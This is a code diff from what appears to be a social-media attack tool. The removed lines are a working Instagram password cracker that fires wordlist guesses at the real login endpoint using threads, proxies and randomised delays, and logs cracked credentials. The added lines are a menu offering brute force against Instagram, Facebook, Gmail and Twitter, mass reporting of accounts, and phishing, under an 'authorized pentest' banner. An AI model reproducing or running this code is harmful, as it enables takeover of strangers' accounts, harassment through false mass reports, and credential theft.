@@ -1,135 +1,111 @@
-Main Cracker: `inst.py`**
-```python
-#!/usr/bin/env python3
-"""
-instshell v2.0 - Ultimate Instagram Cracker
-GitHub: https://github.com/Khalidhusain786/instshell
-Kali Linux Optimized
-"""
+from utils import *
+from rich.console import Console
+import platform
+console = Console()
 
-import requests
-import time
-import random
-import argparse
-import sys
-import os
-from concurrent.futures import ThreadPoolExecutor
-import json
-from pathlib import Path
+def banner():
+    """Khalid Husain v1 Banner"""
+    console.print("""
+[bold cyan]╔══════════════════════════════════════════════════════════════╗[/bold cyan]
+[bold cyan]║                      [bold red]KHALID HUSAIN[/bold red] v1                     ║[/bold cyan]
+[bold cyan]║              [bold yellow]Advanced Social Media Pentest Tool[/bold yellow]        ║[/bold cyan]
+[bold cyan]║                 [green]Authorized Penetration Testing[/green]               ║[/bold cyan]
+[bold cyan]╚══════════════════════════════════════════════════════════════╝[/bold cyan]
+    """)
 
-class InstShell:
-    def __init__(self, username, wordlist, threads=4, proxy=None):
-        self.username = username
-        self.wordlist = wordlist
-        self.threads = threads
-        self.proxy = proxy
-        self.session = requests.Session()
-        self.cracked = False
-        self.setup()
-        
-    def banner(self):
-        print("""
-╔══════════════════════════════════════════════════════╗
-║   🔥 instshell v2.0 - Instagram Cracker 🔥          ║
-║        GitHub: Khalidhusain786/instshell            ║
-║              Kali Linux Optimized                   ║
-╚══════════════════════════════════════════════════════╝
-        """)
-        
-    def setup(self):
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': '*/*',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://www.instagram.com',
-            'Referer': 'https://www.instagram.com/accounts/login/',
-        })
-        
-    def get_csrf(self):
+# print banner & loading screen
+banner()
+start()
+
+# select social media
+choice = c1()
+
+# advanced password options
+def get_advanced_wordlist():
+    """Get advanced/fast wordlist with options"""
+    console.print("\n[bold yellow]🛡️ PASSWORD OPTIONS 🛡️[/bold yellow]")
+    console.print("[bold green]1.[/bold green] Basic Wordlist")
+    console.print("[bold green]2.[/bold green] Advanced Combo List (User:Pass)")
+    console.print("[bold green]3.[/bold green] RockYou.txt (14M passwords)")
+    console.print("[bold green]4.[/bold green] Custom Generated (Fast)")
+    console.print("[bold green]5.[/bold green] Hybrid Attack (Wordlist + Rules)")
+    
+    while True:
         try:
-            r = self.session.get('https://www.instagram.com/accounts/login/')
-            import re
-            csrf = re.search(r'"csrf_token":"([^"]+)"', r.text)
-            if csrf:
-                self.session.headers['X-CSRFToken'] = csrf.group(1)
-                return True
+            opt = int(input("\n[bold cyan]Select password option [1-5]: [/bold cyan]"))
+            if opt in [1,2,3,4,5]:
+                break
+            else:
+                console.print("[bold red]❌ Invalid option! Choose 1-5[/bold red]")
         except:
-            pass
-        return False
+            console.print("[bold red]❌ Enter a number![/bold red]")
     
-    def try_password(self, password):
-        if self.cracked:
-            return None
-            
-        data = {
-            'username': self.username,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
-            'queryParams': '{}',
-            'optIntoOneTap': 'false'
-        }
-        
-        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
-        
-        try:
-            r = self.session.post(
-                'https://www.instagram.com/accounts/login/ajax/',
-                data=data,
-                proxies=proxies,
-                timeout=15
-            )
-            
-            if (r.status_code == 200 and 
-                'checkpoint_required' not in r.text and
-                ('authenticated":true' in r.text or '"logged_in":1' in r.text)):
-                
-                self.cracked = True
-                result = f"{self.username}:{password}"
-                with open('cracked.txt', 'a') as f:
-                    f.write(result + '\n')
-                print(f"\n🎯 CRACKED! 🎯\n👤 {self.username}\n🔑 {password}")
-                return result
-                
-        except:
-            pass
-            
-        print(f"[{password[:8]}...]", end='\r')
-        time.sleep(random.uniform(3, 7))
-        return None
-    
-    def run(self):
-        self.banner()
-        print(f"🎯 Target: {self.username}")
-        print(f"📝 Wordlist: {self.wordlist}")
-        
-        if not self.get_csrf():
-            print("❌ CSRF Failed")
-            return
-            
-        with open(self.wordlist) as f:
-            passwords = [l.strip() for l in f if l.strip()]
-            
-        print(f"🔢 {len(passwords):,} passwords loaded")
-        
-        with ThreadPoolExecutor(max_workers=self.threads) as pool:
-            for pwd in passwords:
-                if self.cracked:
-                    break
-                pool.submit(self.try_password, pwd)
-                
-        if not self.cracked:
-            print("\n❌ Not found")
+    if opt == 1:
+        return get_wordlist()
+    elif opt == 2:
+        return get_combo_list()
+    elif opt == 3:
+        return "rockyou.txt"
+    elif opt == 4:
+        target = get_username()
+        return generate_custom_wordlist(target)
+    elif opt == 5:
+        base_list = get_wordlist()
+        return apply_rules(base_list)
 
-def main():
-    parser = argparse.ArgumentParser(description='instshell - Instagram Cracker')
-    parser.add_argument('-u', '--user', required=True)
-    parser.add_argument('-w', '--wordlist', required=True)
-    parser.add_argument('-t', '--threads', type=int, default=4)
-    parser.add_argument('--proxy', help='Proxy socks5://ip:port')
-    
-    args = parser.parse_args()
-    
-    cracker = InstShell(args.user, args.wordlist, args.threads, args.proxy)
-    cracker.run()
+#vpn on/off
+vpn = c_vpn()
 
-if __name__ == '__main__':
-    main()
+if vpn == 1:
+    if "Linux" not in platform.system():
+        vpn_error()
+
+def handle_platform(platform_name):
+    """Unified handler for all platforms"""
+    choice = start_instagram()  # This should be renamed to start_platform()
+    
+    if choice == 1:  # Brute Force
+        username = get_platform_username(platform_name)
+        wordlist = get_advanced_wordlist()
+        if platform_name == "instagram":
+            insta_bruteforce(username, wordlist, vpn)
+        elif platform_name == "facebook":
+            facebook_bruteforce(username, wordlist, vpn)
+        elif platform_name == "gmail":
+            gmail_bruteforce(username, wordlist, vpn)
+        elif platform_name == "twitter":
+            twitter_bruteforce(username, wordlist, vpn)
+            
+    elif choice == 2:  # Mass Report
+        if platform_name == "instagram":
+            username = get_username()
+            amount = get_amount()
+            insta_massreport(username, vpn, amount, 1)
+        elif platform_name == "facebook":
+            facebook_massreport()
+        elif platform_name == "gmail":
+            gmail_massreport()
+        elif platform_name == "twitter":
+            twitter_massreport()
+            
+    elif choice == 3:  # Phishing
+        if platform_name == "instagram":
+            insta_phishing()
+        elif platform_name == "facebook":
+            facebook_phishing()
+        elif platform_name == "gmail":
+            gmail_phishing()
+        elif platform_name == "twitter":
+            twitter_phishing()
+
+# Main platform selection with advanced features
+if choice == 1:
+    handle_platform("instagram")
+elif choice == 2:
+    handle_platform("facebook")
+elif choice == 3:
+    handle_platform("gmail")
+elif choice == 4:
+    handle_platform("twitter")
+
+console.print("\n[bold green]✅ Pentest completed! Check your results.[/bold green]")
